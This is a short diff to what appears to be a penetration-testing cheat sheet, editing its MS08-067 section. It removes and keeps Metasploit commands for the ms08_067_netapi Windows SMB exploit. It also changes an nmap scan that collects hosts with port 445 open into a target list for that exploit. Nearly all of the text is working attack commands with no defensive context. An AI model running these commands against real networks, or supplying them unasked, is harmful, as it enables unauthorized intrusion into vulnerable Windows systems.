@@ -110,13 +110,7 @@ exploit
 
 # MS08-067
 
-use exploit/windows/smb/ms08_067_netapi
-set THREADS 25
-check 192.168.0.100-192.168.0.120
-     or
-check 192.168.0.1/24
-
-nmap -Pn -n -T4 --open -p445 <target range> | grep 'scan report' | awk '{print $5}' > list
+nmap -Pn -n -T4 --open -p445 <target range> | grep 'scan report' | awk '{print $5}' > /root/list
 
 use exploit/windows/smb/ms08_067_netapi
 set RHOST file:/root/list
